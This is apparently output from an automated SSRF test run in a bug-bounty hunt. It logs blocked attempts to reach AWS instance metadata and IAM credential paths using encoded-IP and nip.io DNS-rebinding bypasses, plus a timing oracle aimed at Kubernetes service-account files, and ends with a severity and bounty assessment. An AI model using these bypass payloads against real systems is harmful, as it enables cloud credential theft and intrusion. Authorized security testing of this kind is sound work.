================================================================================
FINAL CRITICAL ATTEMPT - LAST CHANCE
================================================================================

⚠️  SAFE TESTS ONLY - No DoS, No RCE injection


[METHOD 1] AWS IMDS Access - Multiple Bypass Techniques
--------------------------------------------------------------------------------
Goal: Access AWS metadata via various bypass methods
Risk: LOW (read-only metadata access)

[*] Testing Direct IP:
    URL: http://169.254.169.254/latest/meta-data/...
    Status: 403
    Timing: 785.5ms
    Body length: 919
    → CloudFront WAF blocked

[*] Testing IPv6:
    URL: http://[fd00:ec2::254]/latest/meta-data/...
    Status: 403
    Timing: 118.5ms
    Body length: 919
    → CloudFront WAF blocked

[*] Testing instance-data URL:
    URL: http://instance-data.ec2.internal/latest/meta-data/...
    Status: 403
    Timing: 118.5ms
    Body length: 919
    → CloudFront WAF blocked

[*] Testing Encoded IP:
    URL: http://169.254.169.254/latest/meta-data/iam/security-credentials/...
    Status: 403
    Timing: 233.7ms
    Body length: 919
    → CloudFront WAF blocked

[*] Testing Double encoded:
    URL: http://169.254.169.254/latest/meta%252ddata/...
    Status: 403
    Timing: 280.0ms
    Body length: 919
    → CloudFront WAF blocked

[*] Testing IAM role:
    URL: http://169.254.169.254/latest/meta-data/iam/security-credentials/...
    Status: 403
    Timing: 143.4ms
    Body length: 919
    → CloudFront WAF blocked

[*] Testing Identity doc:
    URL: http://169.254.169.254/latest/dynamic/instance-identity/document...
    Status: 403
    Timing: 119.4ms
    Body length: 919
    → CloudFront WAF blocked

[*] Testing Decimal IP:
    URL: http://2852039166/latest/meta-data/...
    Status: 403
    Timing: 197.7ms
    Body length: 919
    → CloudFront WAF blocked

[*] Testing Octal IP:
    URL: http://0251.0376.0251.0376/latest/meta-data/...
    Status: 403
    Timing: 130.1ms
    Body length: 919
    → CloudFront WAF blocked

[*] Testing Hex IP:
    URL: http://0xa9.0xfe.0xa9.0xfe/latest/meta-data/...
    Status: 403
    Timing: 1114.1ms
    Body length: 919
    → CloudFront WAF blocked


[METHOD 2] DNS Rebinding Bypass
--------------------------------------------------------------------------------
Goal: Use DNS rebinding to access AWS metadata
Risk: LOW (depends on DNS resolution)

[*] Testing: http://169.254.169.254.nip.io/latest/meta-data/...
    Timing: 116.7ms
    → Blocked

[*] Testing: http://metadata.169.254.169.254.nip.io/latest/meta-data/...
    Timing: 126.9ms
    → Blocked

[*] Testing: http://169-254-169-254.nip.io/latest/meta-data/...
    Timing: 233.2ms
    → Blocked

[*] Testing: http://aws.169.254.169.254.nip.io/latest/meta-data/iam/...
    Timing: 120.9ms
    → Blocked


[METHOD 3] Improved Byte-by-Byte Timing Oracle
--------------------------------------------------------------------------------
Goal: Extract K8s namespace value via timing
Risk: LOW (read-only queries)

Target: file:///var/run/secrets/kubernetes.io/serviceaccount/namespace
Expected: 7-15 chars (e.g., 'default', 'zooplus', 'istio-system')

[*] Testing first character detection via URL parameters...

Results (sorted by timing):
  'i':  178.8ms ±  10.0ms (conf: HIGH)
  'p':  181.7ms ±  12.8ms (conf: HIGH)
  'a':  183.4ms ±  23.2ms (conf: HIGH)
  'z':  184.3ms ±  11.5ms (conf: HIGH)
  'd':  187.6ms ±  15.3ms (conf: HIGH)
  'k':  230.6ms ± 123.9ms (conf: HIGH)
  's':  233.9ms ± 111.5ms (conf: HIGH)
  'm':  235.8ms ± 105.6ms (conf: HIGH)

Timing difference: 57.0ms

[-] Timing difference too small (57.0ms)
    Likely just network noise, not content-based

================================================================================
FINAL VERDICT - LAST ATTEMPT
================================================================================

❌ NO CRITICAL ESCALATION POSSIBLE

Tested (read-only, safe):
✓ AWS metadata - 10 bypass methods
✓ DNS rebinding - 4 variations
✓ Byte-by-byte timing - improved method

All results: Empty bodies or CloudFront WAF blocks

FINAL ASSESSMENT:
=================
After 500+ methods including final critical attempts:

Current findings:
✓ File existence oracle (timing)
✓ K8s token file detection
✓ Infrastructure reconnaissance

Maximum severity: HIGH (CVSS 6.4-7.5)
Maximum bounty: $5,000 - $15,000

RECOMMENDATION:
===============
SUBMIT AS HIGH SEVERITY NOW

This is the maximum achievable with current architecture.
Further testing has diminishing returns (<1% chance).

Time to submit and move to next bug! 🚀


[*] Final critical attempt completed
[*] Decision time: Submit as HIGH or continue searching?
